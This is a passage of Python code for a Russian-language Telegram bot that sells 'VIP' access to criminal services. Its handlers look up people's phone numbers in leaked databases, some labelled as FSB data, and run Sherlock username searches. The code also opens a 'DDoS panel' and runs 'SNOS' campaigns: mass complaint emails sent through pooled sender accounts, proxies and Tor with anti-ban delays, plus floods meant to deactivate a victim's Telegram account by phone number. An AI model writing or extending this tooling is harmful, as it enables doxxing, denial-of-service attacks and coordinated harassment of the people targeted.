def cmd_kadastr(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🏠 Используйте: /kadastr Москва, ул. Тверская, д. 1"); return
    register_user(message.from_user, f"поиск кадастра по адресу: {parts[1].strip()}")
    text, report = lookup_kadastr(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["coords"])
def cmd_coords(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "📍 Используйте: <code>/coords 55.7558,37.6173</code>",
                     parse_mode="HTML"); return
    register_user(message.from_user, f"поиск по координатам: {parts[1].strip()}")
    bot.send_chat_action(message.chat.id, "typing")
    text, report = lookup_coords(parts[1].strip(), chat_id=message.chat.id)
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["tg"])
def cmd_tg(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "📱 Используйте: /tg username"); return
    register_user(message.from_user, f"Telegram OSINT по @{parts[1].strip()}")
    text, report = lookup_telegram_osint(parts[1].strip())
    if report: last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=report is not None))


@bot.message_handler(commands=["tgid"])
def cmd_tgid(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🆔 Используйте: /tgid 1646744189"); return
    tg_id = parts[1].strip()
    register_user(message.from_user, f"поиск по TG ID: {tg_id}")
    rec = search_tg_by_id(tg_id)
    if not rec:
        bot.reply_to(message, f"❌ ID <code>{tg_id}</code> не найден в Telegram базе.",
                     parse_mode="HTML"); return
    safe_name = rec["name"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    text = (f"✈️ <b>Telegram база — найдено</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>TG ID:</b> <code>{rec['tg_id']}</code>\n"
            f"<b>Имя:</b> {safe_name}\n"
            f"<b>Username:</b> @{rec['username'] or '—'}\n")
    if rec["phone"]:
        text += f"<b>Телефон:</b> <code>+{rec['phone']}</code>\n"
    if rec["username"]:
        text += f"━━━━━━━━━━━━━━━━━━\n<a href='https://t.me/{rec['username']}'>t.me/{rec['username']}</a>"
    report = {"type": "tgid", "title": f"Telegram ID {tg_id}", "sections": [
        {"heading": "Данные", "items": [
            ("TG ID", rec["tg_id"]),
            ("Имя", rec["name"]),
            ("Username", f"@{rec['username']}" if rec["username"] else "—"),
            ("Телефон", f"+{rec['phone']}" if rec["phone"] else "—"),
        ]}]}
    last_reports[message.chat.id] = report
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=result_menu(has_report=True))


@bot.message_handler(commands=["db"])
def cmd_db(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🗄️ Используйте: <code>/db +79161234567</code>",
                     parse_mode="HTML"); return
    phone = parts[1].strip()
    register_user(message.from_user, f"поиск в локальных БД: {phone}")
    interbase_data = search_interbase(phone)
    getcontact_names = clean_getcontact_names(search_getcontact(phone))
    fsb_records = search_fsb_by_phone(phone)
    fsb_num_labels = search_fsb_numbers(phone)
    god_eye_records = search_god_eye_by_phone(phone)
    tg_records = search_tg_by_phone(phone)
    generic_data = search_generic_phone(phone)
    if not any([interbase_data, getcontact_names, fsb_records, fsb_num_labels,
                god_eye_records, tg_records, generic_data]):
        bot.reply_to(message, f"❌ По номеру <code>{phone}</code> ничего не найдено.", parse_mode="HTML")
        return
    text = f"🗄️ <b>Локальные базы данных</b>\n━━━━━━━━━━━━━━━━━━\n<b>Номер:</b> <code>{phone}</code>\n"
    if interbase_data:
        text += "━━━━━━━━━━━━━━━━━━\n📊 <b>Interbase:</b>\n"
        for k, v in interbase_data.items():
            if v: text += f"  • <b>{k}:</b> {v}\n"
    if fsb_records:
        text += f"━━━━━━━━━━━━━━━━━━\n🚨 <b>База ФСБ ({len(fsb_records)}):</b>\n"
        for i, rec in enumerate(fsb_records[:5], 1):
            text += f"  <b>{i}.</b> {rec['ФИО']} — {rec['Дата рождения']}\n"
            if rec.get("Адрес"): text += f"     🏠 {rec['Адрес']}\n"
        if len(fsb_records) > 5:
            text += f"  <i>... и ещё {len(fsb_records) - 5}</i>\n"
    if fsb_num_labels:
        uniq = list(dict.fromkeys(fsb_num_labels))
        text += f"━━━━━━━━━━━━━━━━━━\n📇 <b>Метки ФСБ ({len(uniq)}):</b>\n"
        for lbl in uniq[:20]:
            safe = lbl.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • {safe}\n"
        if len(uniq) > 20:
            text += f"  <i>... и ещё {len(uniq) - 20}</i>\n"
    if getcontact_names:
        text += f"━━━━━━━━━━━━━━━━━━\n📇 <b>Getcontact ({len(getcontact_names)}):</b>\n"
        for name in getcontact_names[:30]:
            safe = name.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • {safe}\n"
        if len(getcontact_names) > 30:
            text += f"  <i>... и ещё {len(getcontact_names) - 30}</i>\n"
    if god_eye_records:
        text += f"━━━━━━━━━━━━━━━━━━\n👁 <b>God_eye ({len(god_eye_records)}):</b>\n"
        for rec in god_eye_records[:10]:
            text += (f"  • ID <code>{rec['tg_id']}</code> @{rec['username'] or '—'} — "
                     f"{rec['first_name']} {rec['last_name']}\n")
    if tg_records:
        text += f"━━━━━━━━━━━━━━━━━━\n✈️ <b>Telegram база ({len(tg_records)}):</b>\n"
        for rec in tg_records[:10]:
            safe_name = rec["name"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += (f"  • ID <code>{rec['tg_id']}</code> @{rec['username'] or '—'} — {safe_name}\n")
        if len(tg_records) > 10:
            text += f"  <i>... и ещё {len(tg_records) - 10}</i>\n"
    if generic_data:
        text += "━━━━━━━━━━━━━━━━━━\n📦 <b>Прочие базы:</b>\n"
        text += _format_db_block("Прочие базы", "📦", generic_data, limit=20)
    bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True)


@bot.message_handler(commands=["reloaddb"])
def cmd_reloaddb(message):
    if not is_admin(message.from_user): return
    for k in db_loaded: db_loaded[k] = False
    load_dynamic_databases()
    bot.reply_to(message, "✅ Базы перезагружены.")


@bot.message_handler(commands=["monitor"])
def cmd_monitor(message):
    if not check_access(message, require_vip=False): return
    register_user(message.from_user, "открыл мониторинг")
    bot.send_message(message.chat.id, "📡 <b>Uptime-мониторинг</b>\n\nВыберите действие:",
                     parse_mode="HTML", reply_markup=monitor_menu())


@bot.message_handler(commands=["region"])
def cmd_region(message):
    if not check_access(message, require_vip=False): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        current = user_regions.get(message.chat.id, "RU")
        bot.reply_to(message, f"Текущий регион: <b>{current}</b>\nПример: /region KZ",
                     parse_mode="HTML"); return
    new_region = parts[1].strip().upper()
    if len(new_region) != 2 or not new_region.isalpha():
        bot.reply_to(message, "❌ Регион — двухбуквенный код: RU, KZ, US, DE..."); return
    register_user(message.from_user, f"сменил регион на {new_region}")
    user_regions[message.chat.id] = new_region
    bot.reply_to(message, f"✅ Регион: <b>{new_region}</b>", parse_mode="HTML")


@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(
            message,
            "📣 Используй: <code>/broadcast Текст сообщения</code>\n"
            "Поддерживается HTML.",
            parse_mode="HTML")
        return
    text = parts[1].strip()
    register_user(message.from_user, f"запустил рассылку (команда): {text[:50]}")
    bot.reply_to(message, f"📣 Запускаю рассылку для {len(known_users)} пользователей...")
    threading.Thread(target=owner_broadcast, args=(message.chat.id, text), daemon=True).start()


@bot.message_handler(commands=["nick"])
def cmd_nick(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🕵️ Используйте: /nick username"); return
    username = parts[1].strip().lstrip("@")
    register_user(message.from_user, f"Sherlock поиск по нику: {username}")
    status_msg = bot.reply_to(message, f"🕵️ Проверяю <code>{username}</code> по сайтам Шерлока...", parse_mode="HTML")
    found = check_sherlock_username(username)
    if not found:
        bot.edit_message_text(
            f"🕵️ <b>Sherlock</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>Ник:</b> <code>{username}</code>\n\n"
            f"❌ Ничего не найдено (или сайты заблокировали запрос).",
            message.chat.id, status_msg.message_id, parse_mode="HTML")
        return
    text = (f"🕵️ <b>Sherlock — найдено {len(found)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Ник:</b> <code>{username}</code>\n\n")
    for f in found[:40]:
        text += f"  • <b>{f['site']}</b> — <a href='{f['url']}'>профиль</a>\n"
    if len(found) > 40:
        text += f"  <i>... и ещё {len(found) - 40}</i>\n"
    bot.edit_message_text(text, message.chat.id, status_msg.message_id,
                          parse_mode="HTML", disable_web_page_preview=True)


@bot.message_handler(commands=["vk"])
def cmd_vk(message):
    ok, _ = check_access_or_free(message)
    if not ok: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🔗 Используйте: /vk https://vk.com/username"); return
    vk_url = parts[1].strip()
    register_user(message.from_user, f"VK поиск: {vk_url}")
    result = check_vk_public_phone(vk_url)
    if result and result.get("public_phones"):
        text = (
            f"🔗 <b>VK — публичные контакты</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Ссылка:</b> {vk_url}\n"
            f"<b>Найдено публичных номеров:</b>\n"
        )
        for ph in result["public_phones"]:
            text += f"  • <code>+{ph}</code>\n"
        text += (
            f"\n⚠️ <i>Это номера, которые пользователь сам указал в контактах. "
            f"Привязанный к аккаунту номер VK API не отдаёт.</i>"
        )
        bot.reply_to(message, text, parse_mode="HTML", disable_web_page_preview=True)
    else:
        bot.reply_to(
            message,
            f"🔗 <b>VK</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>Ссылка:</b> {vk_url}\n\n"
            f"❌ Публичных номеров в контактах не найдено.\n\n"
            f"<i>Привязанный к аккаунту номер через API VK получить нельзя — "
            f"он скрыт и доступен только владельцу аккаунта.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


@bot.message_handler(commands=["ddos"])
def cmd_ddos(message):
    if not has_vip(message.from_user) and not is_admin(message.from_user):
        show_vip_wall(message.chat.id, message.from_user); return
    register_user(message.from_user, "открыл DDoS командой")
    bot.send_message(message.chat.id,
        "💣 <b>DDoS-панель</b>\nВыберите действие:", parse_mode="HTML",
        reply_markup=ddos_menu())


@bot.message_handler(commands=["ddos_stats"])
def cmd_ddos_stats(message):
    if not is_admin(message.from_user): return
    bot.reply_to(message,
        f"📊 <b>DDoS статистика</b>\n"
        f"Атак: {ddos_stats.get('attacks', 0)}\n"
        f"Запросов: {ddos_stats.get('total_requests', 0)}\n"
        f"Ошибок: {ddos_stats.get('failed', 0)}\n"
        f"В очереди: {len(_ddos_queue)}\n"
        f"Активных: {len(_ddos_active)}", parse_mode="HTML")


# ================== VIP-ОБРАБОТЧИКИ ==================
def process_vip_grant(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    parts = message.text.strip().split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ Формат: <code>ID дни</code>", parse_mode="HTML"); return
    try:
        target_id = int(parts[0])
        days = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ ID и дни должны быть числами."); return
    if days == 0 or days < -1:
        bot.reply_to(message, "❌ Дни: положительное число или -1 (бессрочно)."); return
    rec = grant_vip(target_id, days, granted_by=message.from_user.username or "admin")
    until = "бессрочно" if rec["until"] == -1 else datetime.fromtimestamp(rec["until"]).strftime("%Y-%m-%d %H:%M")
    bot.reply_to(message, f"✅ VIP выдан <code>{target_id}</code>\n<b>До:</b> {until}",
                 parse_mode="HTML")
    try:
        bot.send_message(target_id,
                         f"💎 <b>Вам выдан VIP!</b>\n<b>До:</b> {until}\n\nПриятного использования!",
                         parse_mode="HTML")
    except Exception:
        pass


def process_vip_revoke(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        bot.reply_to(message, "❌ ID должен быть числом."); return
    if revoke_vip(target_id):
        bot.reply_to(message, f"✅ VIP снят с <code>{target_id}</code>", parse_mode="HTML")
        try:
            bot.send_message(target_id, "❌ Ваш VIP-доступ был снят администратором.")
        except Exception:
            pass
    else:
        bot.reply_to(message, f"⚠️ У <code>{target_id}</code> не было VIP.", parse_mode="HTML")


def process_vip_edit_pay(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    parts = [p.strip() for p in message.text.split("|")]
    if len(parts) < 4:
        bot.reply_to(message,
                     "❌ Нужно 4 части через <code>|</code>:\n"
                     "<code>банк|карта|получатель|примечание</code>",
                     parse_mode="HTML")
        return
    VIP_PAYMENT_INFO["bank"] = parts[0]
    VIP_PAYMENT_INFO["card"] = parts[1]
    VIP_PAYMENT_INFO["holder"] = parts[2]
    VIP_PAYMENT_INFO["note"] = parts[3]
    save_vip_pay_info()
    bot.reply_to(message,
                 f"✅ Реквизиты (рубли) обновлены:\n"
                 f"  🏦 <b>Банк:</b> {VIP_PAYMENT_INFO['bank']}\n"
                 f"  💳 <b>Карта:</b> <code>{VIP_PAYMENT_INFO['card']}</code>\n"
                 f"  👤 <b>Получатель:</b> {VIP_PAYMENT_INFO['holder']}\n"
                 f"  📝 <b>Примечание:</b> {VIP_PAYMENT_INFO['note']}",
                 parse_mode="HTML")


def process_vip_edit_nft(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    parts = [p.strip() for p in message.text.split("|")]
    if len(parts) < 4:
        bot.reply_to(message,
                     "❌ Нужно 4 части через <code>|</code>:\n"
                     "<code>сеть|коллекция|получатель|примечание</code>",
                     parse_mode="HTML")
        return
    NFT_PAYMENT_INFO["network"] = parts[0]
    NFT_PAYMENT_INFO["collection"] = parts[1]
    NFT_PAYMENT_INFO["receiver"] = parts[2]
    NFT_PAYMENT_INFO["note"] = parts[3]
    save_nft_pay_info()
    bot.reply_to(message,
                 f"✅ Реквизиты (NFT) обновлены:\n"
                 f"  🪙 <b>Сеть:</b> {NFT_PAYMENT_INFO['network']}\n"
                 f"  🖼 <b>Коллекция:</b> <code>{NFT_PAYMENT_INFO['collection']}</code>\n"
                 f"  👤 <b>Получатель:</b> {NFT_PAYMENT_INFO['receiver']}\n"
                 f"  📝 <b>Примечание:</b> {NFT_PAYMENT_INFO['note']}",
                 parse_mode="HTML")


def process_vip_edit_crypto(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    parts = [p.strip() for p in message.text.split("|")]
    if len(parts) < 4:
        bot.reply_to(message,
                     "❌ Нужно 4 части через <code>|</code>:\n"
                     "<code>сеть|адрес|курс|примечание</code>",
                     parse_mode="HTML")
        return
    try:
        rate = float(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Курс должен быть числом."); return
    CRYPTO_PAYMENT_INFO["network"] = parts[0]
    CRYPTO_PAYMENT_INFO["address"] = parts[1]
    CRYPTO_PAYMENT_INFO["rub_per_ton"] = rate
    CRYPTO_PAYMENT_INFO["note"] = parts[3]
    save_crypto_pay_info()
    bot.reply_to(message,
                 f"✅ Реквизиты (крипта) обновлены:\n"
                 f"  💎 <b>Сеть:</b> {CRYPTO_PAYMENT_INFO['network']}\n"
                 f"  📬 <b>Адрес:</b> <code>{CRYPTO_PAYMENT_INFO['address']}</code>\n"
                 f"  💱 <b>Курс:</b> 1 = {rate:.0f} ₽\n"
                 f"  📝 <b>Примечание:</b> {CRYPTO_PAYMENT_INFO['note']}",
                 parse_mode="HTML")


def process_vip_proof(message):
    data = last_reports.get(f"vip_proof_{message.chat.id}")
    if not data:
        bot.reply_to(message, "❌ Сессия оплаты истекла. Начните заново: /vip")
        return
    if message.content_type not in ("photo", "document"):
        bot.reply_to(message, "❌ Нужен именно скриншот (фото или файл-изображение). Отмена.")
        return
    if message.content_type == "photo":
        file_id = message.photo[-1].file_id
        ext = ".jpg"
    else:
        doc = message.document
        if not (doc.mime_type or "").lower().startswith("image/"):
            bot.reply_to(message, "❌ Файл не является изображением. Отмена.")
            return
        file_id = doc.file_id
        ext = os.path.splitext(doc.file_name or "")[1] or ".jpg"
    try:
        file_info = bot.get_file(file_id)
        proof_bytes = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Не удалось скачать скрин: {str(e)[:100]}")
        return
    order_id = f"{int(time.time())}_{message.from_user.id}"
    proof_path = os.path.join(PROOF_DIR, f"{order_id}{ext}")
    try:
        with open(proof_path, "wb") as f:
            f.write(proof_bytes)
    except Exception as e:
        bot.reply_to(message, f"❌ Не удалось сохранить скрин: {str(e)[:100]}")
        return
    method = data.get("method", "rub")
    method_label = {
        "rub": "💳 Рубли (ЮMoney)",
        "nft": "🪙 NFT (@lonazov)",
        "crypto": f"💎 Крипта (TON) → {CRYPTO_PAYMENT_INFO['address']}",
    }.get(method, method)
    order = {
        "id": order_id,
        "user_id": message.from_user.id,
        "username": message.from_user.username or "",
        "tariff": data["tariff"],
        "label": data["label"],
        "price": data["price"],
        "days": data["days"],
        "method": method,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "pending",
        "proof_path": proof_path,
    }
    vip_payments.append(order)
    save_payments()
    register_user(message.from_user, f"создал заявку VIP ({method}): {data['label']} (со скрином)")
    admin_id = get_admin_id()
    if admin_id:
        try:
            with open(proof_path, "rb") as pf:
                bot.send_photo(
                    admin_id, pf,
                    caption=(f"💰 <b>Новая заявка на VIP</b>\n━━━━━━━━━━━━━━━━━━\n"
                             f"<b>ID заявки:</b> <code>{order_id}</code>\n"
                             f"<b>Пользователь:</b> <code>{message.from_user.id}</code> "
                             f"@{message.from_user.username or '—'}\n"
                             f"<b>Тариф:</b> {data['label']} ({data['price']} ₽)\n"
                             f"<b>Способ:</b> {method_label}\n\n"
                             f"Подтверди в «💰 Заявки на оплату»."),
                    parse_mode="HTML")
        except Exception:
            pass
    last_reports.pop(f"vip_proof_{message.chat.id}", None)
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В VIP-меню", callback_data="vip_menu"))
    bot.reply_to(
        message,
        f"✅ <b>Заявка отправлена на проверку</b>\n\n"
        f"<b>Номер:</b> <code>{order_id}</code>\n"
        f"<b>Способ:</b> {method_label}\n"
        f"Скриншот прикреплён. Администратор проверит оплату и активирует VIP.",
        parse_mode="HTML", reply_markup=kb)


def process_owner_broadcast(message):
    if not (is_admin(message.from_user) or is_owner(message.from_user)):
        return
    text = message.text.strip()
    if len(text) < 3:
        bot.reply_to(message, "❌ Слишком короткий текст. Отмена.")
        return
    register_user(message.from_user, f"запустил рассылку всем: {text[:50]}")
    bot.send_message(message.chat.id, f"📣 Запускаю рассылку для {len(known_users)} пользователей...")
    threading.Thread(target=owner_broadcast, args=(message.chat.id, text), daemon=True).start()


# ================== SNOS STEP ==================
def snos_step_account_username(message, template_key):
    username = validate_tg_username(message.text)
    if not username:
        bot.send_message(message.chat.id, "❌ Некорректный username. Отмена.")
        return
    msg = bot.send_message(message.chat.id, "Введите ID пользователя (число):")
    bot.register_next_step_handler(msg, snos_step_account_id, template_key, username)


def snos_step_account_id(message, template_key, username):
    user_id = message.text.strip()
    if not user_id.isdigit():
        bot.send_message(message.chat.id, "❌ ID должен быть числом. Отмена.")
        return
    if template_key in ("sessions", "virtual_number"):
        subject, body = snos_pick("account", template_key, username=username, user_id=user_id)
        if not body:
            bot.send_message(message.chat.id, "❌ Шаблон не найден. Отмена.")
            return
        snos_confirm(message.chat.id, message.from_user, subject, body, template_key)
        return
    msg = bot.send_message(message.chat.id, "Введите ссылку на чат:")
    bot.register_next_step_handler(msg, snos_step_account_chat, template_key, username, user_id)


def snos_step_account_chat(message, template_key, username, user_id):
    chat_link = validate_tg_link(message.text)
    if not chat_link:
        bot.send_message(message.chat.id, "❌ Некорректная ссылка. Отмена.")
        return
    msg = bot.send_message(message.chat.id, "Введите ссылку на нарушение:")
    bot.register_next_step_handler(msg, snos_step_account_violation,
                                   template_key, username, user_id, chat_link)


def snos_step_account_violation(message, template_key, username, user_id, chat_link):
    violation_link = validate_tg_link(message.text)
    if not violation_link:
        bot.send_message(message.chat.id, "❌ Некорректная ссылка. Отмена.")
        return
    subject, body = snos_pick("account", template_key, username=username, user_id=user_id,
                              chat_link=chat_link, violation_link=violation_link)
    if not body:
        bot.send_message(message.chat.id, "❌ Шаблон не найден. Отмена.")
        return
    snos_confirm(message.chat.id, message.from_user, subject, body, template_key)


def snos_step_channel_link(message, template_key):
    channel_link = validate_tg_link(message.text)
    if not channel_link:
        bot.send_message(message.chat.id, "❌ Некорректная ссылка. Отмена.")
        return
    msg = bot.send_message(message.chat.id, "Введите ссылку на нарушение в канале:")
    bot.register_next_step_handler(msg, snos_step_channel_violation, template_key, channel_link)


def snos_step_channel_violation(message, template_key, channel_link):
    channel_violation = validate_tg_link(message.text)
    if not channel_violation:
        bot.send_message(message.chat.id, "❌ Некорректная ссылка. Отмена.")
        return
    subject, body = snos_pick("channel", template_key, channel_link=channel_link,
                              channel_violation=channel_violation)
    if not body:
        bot.send_message(message.chat.id, "❌ Шаблон не найден. Отмена.")
        return
    snos_confirm(message.chat.id, message.from_user, subject, body, template_key)


def snos_step_bot_username(message):
    bot_user = validate_tg_username(message.text)
    if not bot_user:
        bot.send_message(message.chat.id, "❌ Некорректный username. Отмена.")
        return
    subject, body = snos_pick("bot", "bot", bot_user=bot_user)
    if not body:
        bot.send_message(message.chat.id, "❌ Шаблон не найден. Отмена.")
        return
    snos_confirm(message.chat.id, message.from_user, subject, body, "bot")


def snos_confirm(chat_id, user, subject, body, label):
    register_user(user, f"SNOS: {subject}")
    last_reports[f"snos_{chat_id}"] = {"subject": subject, "body": body, "label": label}
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🚀 Отправить", callback_data="snos_send"))
    kb.add(types.InlineKeyboardButton("🟦 ❌ Отмена", callback_data="snos_menu"))
    preview = body[:600] + ("..." if len(body) > 600 else "")
    total = len(SNOS_SENDERS) * len(SNOS_RECEIVERS)
    bot.send_message(
        chat_id,
        f"📨 <b>Проверьте заявку</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Тема:</b> {subject}\n"
        f"<b>Писем:</b> {len(SNOS_SENDERS)} × {len(SNOS_RECEIVERS)} = {total}\n"
        f"<b>Anti-ban:</b> задержка {SNOS_DELAY_MIN}–{SNOS_DELAY_MAX}с, "
        f"лимит {SNOS_MAX_PER_SENDER} писем на отправителя\n\n"
        f"<b>Текст:</b>\n<blockquote>{preview}</blockquote>",
        parse_mode="HTML", reply_markup=kb)


def snos_step_add_sender(message):
    parts = message.text.split(":", 1)
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ Формат: email:пароль. Отмена.")
        return
    email_, pwd = parts[0].strip(), parts[1].strip()
    if "@" not in email_ or not pwd:
        bot.send_message(message.chat.id, "❌ Некорректный email или пароль. Отмена.")
        return
    SNOS_SENDERS[email_] = pwd
    save_snos_config()
    bot.send_message(message.chat.id, f"✅ Отправитель <code>{email_}</code> добавлен.",
                     parse_mode="HTML")


def snos_step_add_receiver(message):
    email_ = message.text.strip()
    if "@" not in email_:
        bot.send_message(message.chat.id, "❌ Некорректный email. Отмена.")
        return
    if email_ in SNOS_RECEIVERS:
        bot.send_message(message.chat.id, "⚠️ Уже в списке.")
        return
    SNOS_RECEIVERS.append(email_)
    save_snos_config()
    bot.send_message(message.chat.id, f"✅ Получатель <code>{email_}</code> добавлен.",
                     parse_mode="HTML")


def snos_web_support_step(message):
    text = message.text.strip()
    if len(text) < 10:
        bot.send_message(message.chat.id, "❌ Слишком короткий текст. Отмена.")
        return
    register_user(message.from_user, "SNOS WEB: support")
    bot.send_message(message.chat.id, "🚀 Запускаю рассылку жалоб через support...")
    threading.Thread(target=snos_web_broadcast_support,
                     args=(message.chat.id, text, "support"), daemon=True).start()


def snos_web_deact_step(message):
    raw = message.text.strip().replace(" ", "")
    digits = re.sub(r"\D", "", raw)
    if len(digits) == 11 and digits.startswith("8"):
        digits = "7" + digits[1:]
    if len(digits) != 11 or not digits.startswith("7"):
        bot.send_message(message.chat.id, "❌ Нужен российский номер в формате +7XXXXXXXXXX. Отмена.")
        return
    register_user(message.from_user, f"SNOS WEB: deactivate +{digits}")
    bot.send_message(message.chat.id, f"💀 Запускаю деактивацию +{digits}...")
    threading.Thread(target=snos_web_broadcast_deactivate,
                     args=(message.chat.id, digits, "deactivate"), daemon=True).start()


@bot.message_handler(commands=["snos_check"])
def cmd_snos_check(message):
    if not is_admin(message.from_user): return
    snos_check_senders(message.chat.id)


@bot.message_handler(commands=["snos_stats"])
def cmd_snos_stats(message):
    if not is_admin(message.from_user): return
    s = _snos_stats
    bot.reply_to(
        message,
        f"📊 <b>SNOS статистика</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"Запусков: {s.get('runs', 0)}\n"
        f"✅ Отправлено: {s.get('sent', 0)}\n"
        f"❌ Ошибок: {s.get('failed', 0)}\n"
        f"💀 Мёртвых отправителей: {len(s.get('dead_senders', []))}\n"
        f"Очередь: {len(_snos_queue)}\n"
        f"Отправителей в пуле: {len(SNOS_SENDERS)}",
        parse_mode="HTML")


@bot.message_handler(commands=["snos_web_proxy_add"])
def cmd_snos_web_proxy_add(message):
    if not is_admin(message.from_user): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Используй: /snos_web_proxy_add http://user:pass@ip:port")
        return
    proxy = parts[1].strip()
    snos_web_config.setdefault("proxies", [])
    if proxy in snos_web_config["proxies"]:
        bot.reply_to(message, "⚠️ Уже есть.")
        return
    snos_web_config["proxies"].append(proxy)
    save_snos_web_config()
    bot.reply_to(message, f"✅ Прокси добавлен. Всего: {len(snos_web_config['proxies'])}")


@bot.message_handler(commands=["snos_web_proxy_clear"])
def cmd_snos_web_proxy_clear(message):
    if not is_admin(message.from_user): return
    snos_web_config["proxies"] = []
    save_snos_web_config()
    bot.reply_to(message, "✅ Список прокси очищен.")


@bot.message_handler(commands=["snos_web_tor_on"])
def cmd_snos_web_tor_on(message):
    if not is_admin(message.from_user): return
    snos_web_config["use_tor"] = True
    save_snos_web_config()
    bot.reply_to(message, "✅ Tor включён (socks5://127.0.0.1:9050).")


@bot.message_handler(commands=["snos_web_tor_off"])
def cmd_snos_web_tor_off(message):
    if not is_admin(message.from_user): return
    snos_web_config["use_tor"] = False
    save_snos_web_config()
    bot.reply_to(message, "✅ Tor выключен.")


@bot.message_handler(commands=["snos_web_count"])
def cmd_snos_web_count(message):
    if not is_admin(message.from_user): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        bot.reply_to(message, "Используй: /snos_web_count 1000")
        return
    n = int(parts[1].strip())
    if n < 1 or n > 1000:
        bot.reply_to(message, "❌ 1..1000")
        return
    snos_web_config["broadcast_count"] = n
    save_snos_web_config()
    bot.reply_to(message, f"✅ Запросов за запуск: {n}")


# ================== CALLBACK ==================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    cid = call.message.chat.id
    uid = call.from_user.id
    if is_blocked(uid):
        bot.answer_callback_query(call.id, "🚫 Доступ запрещён", show_alert=True); return
    if is_maintenance() and not is_admin(call.from_user) and call.data not in (
            "maintenance_on", "maintenance_off", "vip_menu", "vip_buy", "vip_status",
            "vip_rules", "menu_main", "menu_help", "menu_about"):
        bot.answer_callback_query(call.id, "⚠️ Бот на техническом перерыве", show_alert=True)
        try:
            bot.send_message(cid, MAINTENANCE_TEXT, parse_mode="HTML")
        except Exception:
            pass
        return

    if call.data in ("maintenance_on", "maintenance_off"):
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        if call.data == "maintenance_on":
            with maintenance_lock:
                maintenance_mode["active"] = True
                save_maintenance()
            register_user(call.from_user, "включил технический перерыв")
            sent_ok, sent_fail = broadcast_maintenance(MAINTENANCE_TEXT)
            bot.answer_callback_query(call.id, "Технический перерыв включён")
            try:
                bot.edit_message_text(
                    f"⏸️ <b>Технический перерыв включён</b>\n\n"
                    f"Рассылка: ✅ {sent_ok} / ❌ {sent_fail}\n\n"
                    f"Все пользователи получают уведомление и не могут пользоваться ботом.",
                    cid, call.message.message_id, parse_mode="HTML",
                    reply_markup=main_menu(call.from_user))
            except Exception:
                pass
        else:
            with maintenance_lock:
                maintenance_mode["active"] = False
                save_maintenance()
            register_user(call.from_user, "выключил технический перерыв")
            sent_ok, sent_fail = broadcast_maintenance(MAINTENANCE_RESUME_TEXT)
            bot.answer_callback_query(call.id, "Работа возобновлена")
            try:
                bot.edit_message_text(
                    f"▶️ <b>Технический перерыв выключен</b>\n\n"
                    f"Рассылка: ✅ {sent_ok} / ❌ {sent_fail}",
                    cid, call.message.message_id, parse_mode="HTML",
                    reply_markup=main_menu(call.from_user))
            except Exception:
                pass
        return

